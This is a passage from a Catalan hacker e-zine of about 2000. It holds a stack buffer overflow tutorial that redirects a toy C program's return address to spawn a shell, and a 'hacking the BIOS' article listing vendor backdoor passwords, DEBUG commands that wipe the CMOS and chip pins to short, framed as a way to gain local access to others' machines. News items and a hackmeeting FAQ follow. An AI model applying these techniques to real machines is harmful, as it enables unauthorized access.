        movl -4(%ebp),%eax	;%eax = a
        pushl %eax		;apila EAX, és a dir apila a
        call funcio		;crida la funció
	(...)

"call funcio" és la crida en sí, però just abans s'han apilat les dades
que serveixen com a arguments de funcio(). Mirem detingudament què passa,
pas a pas, dins de funcio().

  > movl -8(%ebp),%eax
  > pushl %eax
		LA PILA:
			|               |
			|---------------|<----- esp apunta aquí
			|  valor de a   |
			+---------------+
  > movl -4(%ebp),%eax
  > pushl %eax
		LA PILA:
                        |               | 
			|---------------|<----- esp apunta aquí
			|  valor de b	|
                        |---------------|
                        |  valor de a   |
                        +---------------+

  > call funcio
Aquest moment és molt important. La intrucció CALL el que fa és això:
	-apila la direcció de retorn, és a dir, l'adreça de la pròxima
	 instrucció a ser executada.
	-salta a la rutina funcio.
Per tant...	LA PILA:
                        |               |
                        |---------------|<----- esp apunta aquí
			|     @ RET	|
			|---------------|
                        |  valor de b   |
                        |---------------|
                        |  valor de a   |
                        +---------------+

I en aquest moment entrem en la funció funcio(). Si mirem p.asm, funcio()
correspon a aquest codi:
		pushl %ebp		;aquestes dues primeres instruccions
		movl %esp,%ebp		;sempre estan en totes les rutines.
		jmp .L1
	.L1: 	leave
	        ret

És a dir, apila %ebp, copia %esp a %ebp....
	PILA:
			|		|
			|---------------| <------ esp i ebp apunten aquí
                        |   EBP salvat  |
                        |---------------|
                        |     @ RET     |
                        |---------------|
                        |  valor de b   |
                        |---------------|
                        |  valor de a   |
                        +---------------+

Aleshores venen les intruccions "leave", la qual restauren els
registres modificats dins la funció (a través de successius POPs)
i després la instrucció "leave", que el que fa és un pop de l'@RET
i hi salta.

Així ens quedarà la pila després del ret:


        PILA:
                        |               |
                        |---------------| <------ ebp apunta aquí
                        |  valor de b   |
                        |---------------|
                        |  valor de a   |
                        +---------------+

d) Variables locals i globals

Les variables globals d'un programa tenen el seu espai al segment de dades,
DS. Un exemple de variable global en un programa:

static char username[640]
void main(void) { (...) }

En canvi, les variables locals tenen, gairebé sempre, els seu espai a la pila.
Això té la ventatge de que no ocupen espai de memòria, ja que en esdevenir 
innecessària, la variable és destruïda. Un exemple de variable local:

void funcio666(void) {
	(...)
	int i;
	(...)
}

Aquesta variable estaria situada a la pila, i deixaria d'existir quan la
rutina funcio666() hagués finalitzat.



Aproximació a la idea de buffer overflows
------------------------------------------

Imaginem una funcio() que creés un buffer (char c[640]) com a variable local.
Aleshores, com hem dit abans, aquesta variable quedaria emmagatzemada a la
pila:

    LA PILA:

|               |
|---------------|  -640(%ebp) <---- esp apuntarà aquí
|               |
|     ...	    |
|		    |
|    espai 	    |
|    de 640	    |
|    bytes      |
|    per a      |
|    c[640]     |
|               |
|     ...       |
|               |
|---------------|   (%ebp)    <---- ebp apuntarà aquí
|  EBP salvat   |
|---------------|   4(%ebp)
|     @ RET     |
|---------------|   8(%ebp)
	.
	.
	.


Imaginem que omplissim tot c amb 640 caracters 'A' (0x41h). No passaria res
de l'altre mon. Però i si omplissim c amb 644 caracters? Doncs sí, que c
passaria a ocupar des de [ebp-640] fins a [ebp+3], o sigui que se sobre-
escriuria l'EBP grabat a la pila.

Però el més important: i si omplissim c amb 648 caracters 'A'?
Aleshores c aniria des de [ebp-640] fins a [ebp+7]. Amb el qual haurem sobre-
escrit ni més ni menys que la adreça de retorn!

Intentem posar un altre exemple pràctic: q.c
void funcio() {
        char c[640];
        int i=0;
        for (i=0;i<648;i++) c[i]='A';
        return;
}

int main(void) {
        char a[640];
        funcio();
        if(2==3) system("/bin/sh");  /* a priori, gran estupidesa */
				     /* després veurem pq ho poso */	
        exit(0);
}

Analitzem què passarà: en la funcio(), es crea un espai de 640 bytes a
la pila, que serà ocupat per c[]. Però després c serà escrit amb 648
caracters, el qual farà que se sobreescrigui la ebp salvada i la @RET
(adreça de retorn).

Comprovem-ho:
$ gcc q.c -o q
$ ./q
Segmentation fault (core dumped) 
$

La qual cosa ens permet afirmar que el programa no ha acabat correctament.

Per saber què ha passat, analitzem l'arxiu core, que és un dump (còpia
en un fitxer) de la memòria en el moment del crash del programa.

$ gdb -c core
GNU gdb 4.18
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./q'.
Program terminated with signal 11, Violación de segmento.
#0  0x41414141 in ?? ()
(gdb) info registers
eax            0xbffff830       -1073743824
ecx            0x8048454        134513748
edx            0x287    647
ebx            0x4010548c       1074812044
esp            0xbffffab8       0xbffffab8
ebp            0x41414141       0x41414141
esi            0x4000a610       1073784336
edi            0xbffffd84       -1073742460
eip            0x41414141       0x41414141
eflags         0x10202  66050
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x2b     43
gs             0x2b     43


Conclusió: hem sobreescrit els registres ebp i eip amb 'AAAA' (0x41414141).
Recordem que EIP marca la adreça de la pròxima instrucció que el processador
executarà. El que ha passat és que el processador ha intentat executar
el que hi ha a l'adreça 0x41414141, la qual cosa queda fora del segment de
memòria assigant al nostre programa.


A la pràctica
-------------

Com ho podem aprofitar? Doncs tenim la possibilitat de fer saltar el processa-
dor a l'adreça que volguem. Doncs fem-ho: sobreescriguem EIP amb una adreça
que ens sigui útil. Per demostrar les nostres habilitats adquirides, se
m'acudeix un bon lloc per anar a parar: executar la instrució on el programa,
teòricament, mai arribarà, és a dir, la crida system("/bin/sh") !!

Com ho fem? No és gaire difícil, com comprovarem tot seguit. Primer que res,
hem de saber on és la crida al sistema. Ho farem amb el gdb:

$ gdb q
GNU gdb 4.18
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux"...
(gdb)disassemble main
Dump of assembler code for function main:
0x8048454 <main>:       push   %ebp
0x8048455 <main+1>:     mov    %esp,%ebp
0x8048457 <main+3>:     sub    $0x280,%esp
0x804845d <main+9>:     call   0x8048400 <funcio>
0x8048462 <main+14>:    jmp    0x8048471 <main+29>
0x8048464 <main+16>:    push   $0x80484e0
0x8048469 <main+21>:    call   0x804830c <system>
0x804846e <main+26>:    add    $0x4,%esp
0x8048471 <main+29>:    push   $0x0
0x8048473 <main+31>:    call   0x804833c <exit>
0x8048478 <main+36>:    add    $0x4,%esp
0x804847b <main+39>:    nop
       (...)


Analitzem aquest seguit d'instruccions que comformen la rutina principal
del programa q.c.  Primer es crida funcio(), després se salta a <main+29>
de manera que mai es passa per les instruccions  on volem arribar,
que són "push $0x80484e0" i "call 0x804830c <system>" que ens donarien
una shell.

Ara sabem on voldrem arribar: al "push $0x80484e0". Doncs ja no queda gaire:
només hem d'aconseguir escriure al registre EIP aquesta adreça.

Només hem de modificar una miqueta la rutina funcio() del nostre programa:
void funcio() {
        char c[640];
        int i=0;
        for (i=0;i<644;i++) c[i]='A';
        c[i++]=0x00;
        c[i++]=0x00;
        c[i++]=0x00;
        c[i++]=0x00;             /* aqui hem de substituir els zeros */
                                 /* per l'adreça que ens interessi   */
        return;
}

Ara tornem a compilar el nostre programa, per veure on estarà defini-
tivament situada la rutina que ens donarà la shell:

$ gcc q.c -o q
$ gdb q
GNU gdb 4.18
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux"...
(gdb) disassemble main
Dump of assembler code for function main:
0x80484a4 <main>:       push   %ebp
0x80484a5 <main+1>:     mov    %esp,%ebp
0x80484a7 <main+3>:     sub    $0x280,%esp
0x80484ad <main+9>:     call   0x8048400 <funcio>
0x80484b2 <main+14>:    jmp    0x80484c1 <main+29>
0x80484b4 <main+16>:    push   $0x8048530
0x80484b9 <main+21>:    call   0x804830c <system>
0x80484be <main+26>:    add    $0x4,%esp
0x80484c1 <main+29>:    push   $0x0
0x80484c3 <main+31>:    call   0x804833c <exit>
0x80484c8 <main+36>:    add    $0x4,%esp
0x80484cb <main+39>:    nop
0x80484cc <main+40>:    lea    0x0(%esi,1),%esi
0x80484d0 <main+44>:    leave
0x80484d1 <main+45>:    ret
0x80484d8 <main+52>:    nop
0x80484d9 <main+53>:    nop
---Type <return> to continue, or q <return> to quit---q
Quit
(gdb) Quit

Per tant, volem saltar a 0x80484b4. Doncs ja ho tenim: així quedarà
la rutina funcio():


void funcio() {
        char c[640];
        int i=0;
        for (i=0;i<644;i++) c[i]='A';
        c[i++]=0xb4;
        c[i++]=0x84;
        c[i++]=0x04;
        c[i++]=0x08;             /* volem arribar a 0x80484b4 */
        return;
}

Ara només hem de tornar a compilar q.c i executar-lo, a veure què passa...

$ gcc q.c -o q
$ ./q
bash$

Voi-la, ja tenim la nostra shell!

Conclusió final: si posem en un buffer més dades de les que hi caben, podem
arribar a sobreescriure l'adreça de retorn de la funció implicada, de manera
que podem fer coses força interessants.

Finalment, només una cosa més. Això és el fonament dels buffer overflows.
A la vida real, aquests bugs son aprofitats d'una altra manera.


NOTA IMPORTANT: les adreces poden vairar en els vostres ordinadors. Si heu
	entès de què va la cosa, sabreu posar-hi remei.
	Tot això que he explicat, està comprovat que funciona
	en un sistema i586/RedHat 6.1, i en un i686/RedHat 6.2.

Qualsevol tipus de crítica (costructiva plz) cap a KL4RK@phreaker.net
Qualsevol tipus de crítica destructiva: sé que no sóc un geni, no fa falta
        que m'ho recordeu... /dev/null@nasa.gov   [un fa el que pot!]





###############################################################################
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
###############################################################################

$10$


                               HACKEJAR LA BIOS

                           per Alex Castan Salinas
                              alex.castan@upc.es



Hola xiquets i xiquetes.

En aquestes linies que a continuacio segueixen m'agradaria haver continuat la
saga d'articles sobre hacking local i haver explicat com hackejar una maquina
amb Linux quan hi tenim acces fisic. El fet es que no he pogut per questio de
temps i haurem d'aplacar aquest article. En canvi, escriure un article breu
sobre un tema molt relacionat amb la saga de hacking local: com hackejar la
BIOS.

En molts casos en que estem intentant hackejar localment una maquina, ens
trobarem que per aconseguir un major control sobre aquesta (ja sigui per
aconseguir el fitxer de contrasenyes, ja sigui per modificar un fitxer sobre
el que no tenim privilegis, etc.) haurem de reiniciar-la i arrencar de nou amb
un disquet o CD-ROM. De vegades aixo no sera possible perque han configurat la
BIOS per tal que el PC arrenqui nomes des del disc dur i han protegit la BIOS
amb contrasenya per tal que no podem canviar la seva configuracio.

A continuacio veurem com saltar-nos aquesta proteccio per contrasenya de la
BIOS. Pero anem per passos ...



INTRODUCCIO
===========

La BIOS es un petit microprocessador situat a la placa mare del PC que, entre
d'altres coses, controla com es realitza el proces d'arrencada quan encenem
l'ordinador, com es realitza el test dels diferents dispositius, etc. Per tal
d'assolir el seu objectiu, la BIOS necessita guardar a una petita memoria
anomenada CMOS dades sobre la configuracio de l'ordinador: de quines unitats
de disc disposa i de quin tipus son, amb quina unitat de disc s'intentara
arrencar primer, l'hora i la data del sistema, la contrasenya per accedir a
configurar la BIOS, etc.

Ha de quedar clar que aquesta petita memoria no esta alimentada amb el mateix
corrent electric que la resta de l'ordinador, ja que sino quan apaguessim
aquest es perdria el contingut de la CMOS. La CMOS esta alimentada apart per
una petita bateria auxiliar que tambe esta situada sobre la placa mare,
normalment a prop del chip de la BIOS. Hi han diversos tipus de bateria, pero
el mes normal es trobar una pila de boto CR-232, que te uns dos anys de
duracio.

Per accedir al menu de configuracio de la BIOS, normalment cal premer en el
proces d'arrencada de l'ordinador les tecles Del, F2 o CTRL+ALT+S. Es en
aquest moment que ens podem trobar amb una contrasenya que ens impedeixi
configurar la BIOS. Anem a saltar-nos-la ...



PORTES TRASSERES
================

Els principals fabricants de BIOS: AWARD, AMI i PHOENIX; van instal.lar als
seus primers models de BIOS contrasenyes addicionals, per si un usuari que
havia protegit per contrasenya l'acces a la BIOS del seu ordinador
posteriorment havia oblidat la contrasenya. Algunes d'aquestes contrasenyes
son:

 * AWARD: AWARD SW, AWARD_SW, Award SW, AWARD PW, _award, awkward, J64, j256,
   j262, j332, j322, 01322222, 589589, 589721, 595595, 598598, HLT, SER,
   SKY_FOX, aLLy, aLLY, Condo, CONCAT, TTPTHA, aPAf, HLT, KDD, ZBAAACA,
   ZAAADA, ZJAAADC, djonet, azaaxx

 * AMI: AMI, A.M.I., AMI SW, AMI_SW, BIOS, PASSWORD, HEWITT RAND, Oder

 * AWARD, AMI i d'altres: LKWPETER, lkwpeter, BIOSTAR, biostar, BIOSSTAR,
   biosstar, ALFAROME, ALFAROMEO, Syxz, Wodj

A algunes d'aquestes contrasenyes de vegades cal canviar el caracter _ pel
caracter ?



ESBORRAR LA BIOS MITJANCANT SOFTWARE
====================================

Existeixen multitud de petits programes que ens permeten esborrar la
contrasenya de la BIOS. En un cas desesperat, tambe existeixen programes que
ens permeten esborrar tota la informacio de la BIOS. En aquest ultim cas,
caldra reconfigurar la BIOS despres d'haver-la esborrat.

Podem trobar aquests programes a les seguents adreces:

 * http://www.password-crackers.com/crack.html
 * http://neworder.box.sk , a l'apartat #Utilities, al subapartat
   #BIOS/CMOS tools.

Tambe podem reinicialitzar la BIOS fent servir la comanda DEBUG del MS-DOS. Es
millor executar la comanda treballant sobre MS-DOS pur i dur que sobre una
finestra MS-DOS de Windows. A continuacio escrivim:

per BIOS AMI i AWARD
--------------------
O 70 17
O 71 17
Q

per BIOS PHOENIX
----------------
O 70 FF
O 71 17
Q

o per qualsevol BIOS (invalida la memoria CMOS)
-----------------------------------------------
O 70 2E
O 71 FF
Q

Si mitjancant software no hem aconseguit esborrar la contrasenya de la CMOS,
doncs haurem de passar als grans remeis i esborrarem la contrasenya mitjancant
hardware. Haurem d'apagar l'ordinador, obrir la seva caixa i tallar
momentaniament l'alimentacio electrica cap a la CMOS, esborrant tot el seu
contingut. Com veureu, es mes senzill del que sembla ...

(Encara que si el que voliem era accedir a la informacio del disc dur i hem
d'obrir la caixa de l'ordinador, potser el mes senzill sigui extreure el disc
dur i connectar-lo a un altre ordinador.)



ESBORRAR LA BIOS MITJANCANT JUMPERS
===================================

Els jumpers son uns petits interruptors presents a la placa mare que ens
permeten configurar-la. A les plaques mares modernes existeix un jumper tal
que canviant momentaniament la seva posicio esborra el contingut de la CMOS.
La situacio d'aquest jumper varia en cada model de placa mare, pero normalment
es situa molt a prop de la BIOS. Millor que us assegureu consultant el manual
de la placa mare que podeu trobar a la pagina web del fabricant de la placa.



ESBORRAR LA BIOS TREIENT LA BATERIA
===================================

Potser mes senzill que el procediment anterior es cercar a la placa mare la
pila que alimenta la CMOS i treure-la durant uns instants (millor 30 minuts
per estar segurs). Quan la tornem a posar la CMOS estara desconfigurada. En
cas contrari, toca repetir el proces pero treient la bateria durant mes temps.



ESBORRAR LA BIOS CORTCIRCUITANT EL CHIP
=======================================

Aquest es l'ultim metode que conec i consisteix en curtcircuitar dos pins del
chip de la BIOS durant uns segons. S'ha d'anar amb compte perque aquesta
operacio pot malmetre el chip. Els pins a curtcircuitar depenen dels chips
EPROM emprats per fabricar la BIOS.

El meu article acaba aqui. A continuacio afegeixo una llista amb els chips mes
populars que podeu trobar, pero aquesta llista no l'he elaborat jo sino Elf
Qrin al seu article http://www.elfqrin.com/docs/ngload.html

CHIPS P82C206 (quadrat)
-----------------------
Curtcircuitar els pins 12 i 32 (el primer i l'ultim pin de la vora inferior
del chip) o els pins 74 i 75 (els dos pins de la cantonada superior esquerre).

       74 terra
        |__________________
5v 75--|                   |
       |                   |
       |                   |
       |       CHIPS       |
   1 * |                   |
       |      P82C206      |
       |                   |
       |                   |
       |___________________|
        |                 |
        12 terra          32 5v

OPTi F82C206 (rectangular)
--------------------------
Curtcircuitar els pins 3 i 26 (el tercer pin de la cara esquerre i el cinque
pin de la cara dreta de la vora inferior).

    80              51
     |______________|
81 -|                |- 50
    |                |
    |                |
    |      OPTi      |  
    |                |
    |     F82C206    |
    |                |
100-|________________|-31
     ||           | |
   1 ||           | | 30
      3           26

Dallas DS1287, DS1287A, Benchmarq bp3287MT i bq3287AMT
------------------------------------------------------
Aquests chips tenen la bateria construida dintre del mateix chip, i dura 10
anys. Aixo vol dir que les plaques mares que utilitzen aquests chips no
tindran una bateria addicional i que quan la bateria del chip es gasti caldra
reemplacar-lo. 
Als chips 1287A i 3287AMT curtcircuitar els pins 12 i 21.
Als chips 1287 i 3287MT no es pot esborrar la CMOS i cal reemplacar-los.
Encara que son chips de 24 pins, potser que manquin 5 pins que no s'usen.
Molts chips tenen pins que no usen, encara que normalment son presents.

           __________
      1  -| *  U     |-  24 5v
      2  -|          |-  23
      3  -|          |-  22
      4  -|          |-  21 RCL (RAM Clear)
      5  -|          |-  20
      6  -|          |-  19
      7  -|          |-  18
      8  -|          |-  17
      9  -|          |-  16
      10 -|          |-  15                            
      11 -|          |-  14
terra 12 -|__________|-  13

Dallas DS12885S, Benchmarq bq3258S, Hitachi HD146818AP i Samsung KS82C6818A
---------------------------------------------------------------------------
Son chips DIP rectangulars de 24 pins, normalment sobre un socol. El nombre
escrit sobre aquests chips acaba en 6818. Aquests chips son compatibles en
pins amb el Dallas 1287/1287A, encara que sense bateria interior.
Curtcircuitar els pins 12 i 24.

 24 5v       20                   13
 |___________|____________________|
|                                  |
|             DALLAS               |
|>                                 |
|            DS12885S              |
|                                  |
|__________________________________|
 |                                |
 1                                12 terra

Motorola MC146818AP
-------------------
Curtcircuitar els pins 12 i 24 (son els pins de les cantonades inferior
esquerra i superior dreta). Tambe es pot provar els pins 12 i 20.

            __________
      1   -| *  U     |-  24 5v
      2   -|          |-  23
      3   -|          |-  22
      4   -|          |-  21
      5   -|          |-  20
      6   -|          |-  19
      7   -|          |-  18
      8   -|          |-  17
      9   -|          |-  16
      10  -|          |-  15
      11  -|          |-  14
terra 12  -|__________|-  13



###############################################################################
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
###############################################################################



$11$

&&-----------------------&&
&&                       &&
&&  NOTICIES per BaRner  &&
&&                       &&
&&-----------------------&&


Texte aparegut a Kriptópolis: reflexionem-hi.

------[Kriptópolis]-----------------------------------------------------------
______________________________________________________________________

		     VAGA DE RATOLINS CAIGUTS
______________________________________________________________________

		    Per Carlos Sánchez Almeida
		    (almeida@kriptopolis.com)
		 (traduït al català per cathack)
	   http://www.kriptopolis.com/csa/20000327.html

Tal com va explicar magistralment Juan Carlos García Cuartango, erigit
en "cronista taurino" de Kriptópolis, el passat 18 de març va tindre
lloc un interesant debat sobre ciberdrets, en un local okupat de
Lavapiés. Durant el mateix sens van plantejar si existeix un subjecte
revolucionari en Interne, i en si existís, quins serien els seus
mètodes de lluita.

Aquells que potser volien escoltar-me afirmar que els hackers són la
vanguardia revolucionaria de la Xarxa, es poden emportar una desilusió:
mai he cregut en les vanguardies, ni tan sols la que puguin representar
Fronteres Electroniques o Kriptópolis. El veritable subjecte de canvi
social és la societat sencera.

Una societat lliure no necessita salvadors de cap mena. Només necessita
ciutadants amb la capacitat de pensar i relacionar-se. Ciutadants que
reivindiquin els seus drets emprant tots els mitjans al seu abast.
Ciutadans capaços d'organitzar-se per debatre, en taula rodona o
virtual. Ciutadants pels que en qualsevol moment sigui possible dir NO.

Una de les primeres manifestacions del moviment obrer, en els albirs de
la revolució industrial, fóu el luddisme: treballadors que destrïen
màquines, a les que consideràven responsables de l'atur. Els atacs DoS
o SynFlood a portals d'Internet són tot un simptoma de que els pobles
que obliden la seva història, estàn comdemnats a repetir-la.

L'esperança daurada que encarnaven els hackers es diluïran a curt plaç.
Aquells que voldríen destruïr els murs del sistema, seràn els encarre-
gats de reforçar-los. Però per llavors ja hauràn entregat les seves
armes a tota la societat: noves generacions, lliures d'elits narcicistes,
seràn les encarregades de llevar noves torxes.

La revolució no està en els bugs ni en els exploits, sino en un simple
e-mail. Un correu electrònic capaç de recordar, en tots els ordinadors del
planeta, que sempre hi hauran raons per lluitar. No serà necessari un
virus, com piquete de vaga binari. Estic convençut que seràn molt més
importants les persones capaces d'enviar un miisatge a tota la seva llista
de correu. Un missatge dient NO.

Mentres s'allargui la injusticia, la millor arma de la societat seguirà
essent la vaga general revolucionaria. Una vaga globalitzada, de dimensió
planetària, i a l'abast d'un click.

------[Kriptópolis]-----------------------------------------------------------


*Softcatalà anuncia la distribució Linux Mandrake 7.0 en català que es
regala amb el PC-WORLD d'abril

* Microsoft es declarada culpable

El resultat del jutge federal, tot i ke s'ha fet esperar, ha sigut clar:

Microsoft va violar les lleis antimonopoli al utilitzar la seva
avantajada posició en el camp dels sistemes operatius, amb tal
d'assegurar-se el mercat dels navegadors a Internet.

*Bill Gates dona 57 millones de dolars per combatre el sida     Bueno..
algo positiu... tot i ke amb les peles ke té podria aportar mes..

* ja es pot activar la calefecció , obrir les portes del cotxe, etc, amb

el telefon movil!

* L' FBI està investigant un virus informàtic ke pot trucar als serves
d'emergencia dels Estats Units, utilitzant un telèfon 911.

* Es tornarà a celebrar el desfile militar per la diagonal, sembla mentida,
pensavem que havien canviat les coses, desde el 81 k no es celebrava i ara
haurem de tornar a aguantar la presència del paràsit del rei i els seus
tancs i ninotets. Collons! alguna cosa s'haurà de fer no??

He llegit una notícia k diu k s'ha denunciat al portal de Yahoo de frança
per oferir links a subastes de banderes, fotografies i monedes nazis. puaj!

Per cert, una altre notícia,  a EEUU han pillat a un tiu per colar-se en les
màquines dels militars i de algunes universitats, càstig: no apropar-se a cap
ordinador k no sigui el de l'escola, prohibit conectar-se a inet i res de
telèfons, vamos, lo tipic, el govern d'eeuu ja va agafar pràctica amb
tortures d'aquestes amb el Kevin Mitnick.

----[mail]-------------------------------------------------------------------
Asunto: Alcalde, t'equivoques !

El proper diumenge 28 de maig es vol celebrar el Dia de las Fuerzas Armadas
a Barcelona i esta previst que l'exercit espanyol desfili per la Diagonal.
Davant aquesta mostra de prepotencia per part de l'estament militar i
l'exhibició impudica de l'armament que ha dut i esta duent el sofriment i la
mort a milers de persones i a molts pobles en tot el mon s'esta organitzant
una campanya en contra de la celebració del Dia de las Fuerzas Armadas a
Barcelona.

Per començar volem que el nostre alcalde s'assebenti que ni les
organitzacions ciutadanes ni els ciutadans de Barcelona volem veure
l'exercit espanyol a la nostra ciutat, que l'alcalde sapiga que els i les
ciutadanes de Barcelona creiem fermament en la cultura de la pau i de la
solidaritat per a a resolucio de conflictes, i que l'existencia dels
exèrcits a l'inici del segle XXI es un perill per a tots els habitants del
planeta.

Per això envieu un e-mail a:
 alcalde@mail.bcn.es amb còpia a:
 infodefensa@mde.es,
 presidentpujol@presidencia.gencat.es,
 consellerpomes@correu.gencat.es,
 consellertriadu@presidencia.gencat.es,
 consellermacias@correu.gencat.es

 Encapceleu el vostre mail amb la frase: Alcalde, t'equivoques !

PERQUE CAP EXÈRCIT DEFENSA LA PAU !!
NO VOLEM L'EXÈRCIT A BARCELONA !!

 Envieu aquest mail a tota la gent que pugueu, i els mails a l'ajuntament
tant els podeu enviar a titol individual com signats per una entitat.
----[mail]-------------------------------------------------------------------

Errada de seguretat a lExplorer

    Un article publicat abans dahir al rotatiu Wall Street
    Journal posa de manifest una altre forat en la
    seguretat del programa Internet Microsoft Explorer.
    Aquesta errada permet robar informació del disc dur
    de lusuari.
    w

    Mireia Cortés ( Mireia@noticias.com ) - Microsoft reconeix
    aquest forat, que ha estat descobert per un jove
    informàtic, de 21 anys. Aquesta errada afecta les dues
    últimes versions de l' Explorer, és a dir, les versions que
    utilitza més gent.

    La companyia reconeix que aquesta errada fa vulnerables
    els sistemes i va assegurar que Microsoft està treballant
    per tapar el forat. Segons altres fonts,les conseqüències
    són encara més greus ja que poden arribar a permetre
    lextracció de informació confidencial i números de targeta
    de crèdit.

    El descobridor de l'errada ha estat novament Bennet
    Haselton, informàtic que ja diverses vegades ha destapat
    errors de programació en el navegador integrat de
    Microsoft.

    Com és possible entrar a les dades personals? Haselton
    explica que a través duna errada de disseny els hackers
    poden accedir a les cookies gravades en el disc dur. Aquest
    petits arxius permeten als hackers accedir a dades
    concretes de l'usuari ( dades personals, números de targeta
    de crèdit, passwords, accés a comptes de correu..). L'
    errada permet enganyar el Navegador fent-li creure que la
    demanda de lectura de les cookies ve del mateix servidor
    que la va originar.

Nova versió de Nmap 2.53 i del seu front-end.. 

Homepage: http://www.insecure.org/nmap/ 

23/5/00- S'ha innaugurat el carrer Internet a Tarragona...trist però cert.
         Tb van dir d'innaugurar l'Avinguda dels Hackers...però ho veiem
         abusiu (va en serio, no es conya).

El G8 es reuneix a Canadà per parlar sobre mètodes per millorar la seguretat
en la xarxa i eliminar el "ciberterrorisme"... sense comentaris...pero una
pregunta...qui fa que millori la seguretat a la xarxa???

Descoberta una variant del virus I Love You 
    més perillosa i destructiva 

    Una nova variant del famós virus I Love You, 
    denominada VBS/Spammer.A, que ataca als usuaris 
    del programa de correu Microsoft Outlook podria 
    generar major destrucció que el cuc original, segons 
    va informar Compute Associates. 

    Mireia Cortés ( Mireia@noticias.com ) - Tot fa pensar que el 
    virus arriba amb un missatge dassumpte FW i conté un 
    arxiu amb lextensió VBS (visual Basic Script). El nom del 
    arxiu que sadjunta pot canviar cada vegada. 

    El cuc Spammer sautoenvia a totes les entrades de la 
    llibreta de direccions, i després renombra tots els arxius del 
    disc dur i els discs de la xarxa amb una extensió VBS i posa 
    el tamany del arxiu a zero. Daquesta manera, aconsegueix 
    que lordinador i la xarxa puguin estar totalment inoperatius. 

    CA afirma que aquest virus creix de tamany a mesura que 
    sestén, per la qual cosa es podria col&middot;lapsar la Xarxa amb 
    una gran quantitat de tràfic de correu electrònic i provocar 
    errors en els servidors. 

    La companyia recomana als internautes que qualsevol 
    missatge amb un arxiu adjunt VBS, ha de suprimir-se 
    immediatament i no obrir-se. A més els administradors de 
    xarxa haurien de bloquejar tots els arxius VBS en el punt 
    dentrada. En quant als usuaris, es recomana que 
    suprimeixin tots els missatges que continguin la línia 
    dassumpte mencionada. 

* Arriba l'estandar MP4 - per video.


Salut companys!

<.·BaRner·.>

                                          Polític: Si vols manipular la massa,
                                                       apuntat a un Telepizza.

------------------------------------------------------------------------------
==============================================================================
&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&
==============================================================================
------------------------------------------------------------------------------

$12$

  <<<<<<<<<
  hmBCN faq
  >>>>>>>>>



QUE SIGNIFICA hmBCN?

Hackmeeting Barcelona


ES LLAVORS UNA REUNIO DE HACKERS?

Es una reunio de gent interessada en les noves tecnologies i molt especialment
amb aspectes socials (causa i efecte). El nom esta agafat dels Hackmmetings
italians (aquest any en Roma, www.ecn.org/hackit00/), que venen celebrant-se
desde 1998 en Centres Socials Okupats (SCO) i en els que ens hem inspirat.


QUAN?

20, 21, 22 d'octubre del 2000


ON?

En Les Naus (Barcelona) (HIHAPAGINAWEB???)



I VOSALTRES QUI SOU?

De moment, els colectius SinDominio (www.sindominio.net) i Fronteres
Electroniques (www.arnal.es/free), pero tota l'ajuda es poca. Hem muntat una
llista de suscripció lliure per qui pugui ajudar-nos.


PER QUE FEU AIXO?

Aixo vol ser una reunio sense mes pretensions que parlar entre nosaltres,
que ens coneixem majoritariament per correu, i prendre l'aire en mig de
l'ofensiva del Sistema contra Internet, un lloc d'educacio i comunicacio
lliures que voem que ho sigui sent.

EL fulgor dels grans moviments en borsa o els reiterats intents de control
per part de corporacions i goberns semblen haver eclipsat o desanimat als
seus habitants que intente, molts cops en solitari, capejar el temporal
creant opinions, oferint informacio voluntariament o intentant noves rutes
i programes per escapar de la creixent pressio.

La nostra intencio es unir aquestes veus que encara creuen que tenim la
força, dins, fora i a traves de la Xarxa, animar-nos mutuament, coneixens
i discutir les nostres visions. Qui som?, On volem anar?



 EN QUE CONSISTIRA EL HACKMEETING?

Basicament, en conferencies i tallers, ademes d'un cicle de cinema ciberpunk,
una xarxa local i festes :) Pero no sabem encara en que consistiran les
xerrades exactament. La nostra llista perfecta de temes seria:

 *Enfopol i Echelon.
 *Informacio alternativa en la xarxa.
 *Com  emprar les tecnologies pels nostres interesos (tallers de DVD,
  hacking, cripto, net-activismo, anonimat..)
 *Programes lliures.
 *Telefonica  i  altres senyors  feudals.  Acces universal i tarifa plana.
 *Ciberpunk
 *Corporacions en la xarxa
 *Artivisme
 *La  okupacio de makines es com l'okupacio real? Asesoria legal
 *Trucos (treure energia del telefon, etc)
 *Hackers desde dintre. Filosofia.
 *Privacitat practica
 *Els mitjans per dintre
 *Maria i altres formes de hackejar la teva ment
 *Taller d'iniciacio a la navegacio
 *Genealogía d'internet i relació amb els movimients socials
 *Internet en accions polítiques
 *Taller sobre glosari d'internet: sigles, organitzacions, ...
 *Tarjetes inteligentes, firmes digitals..
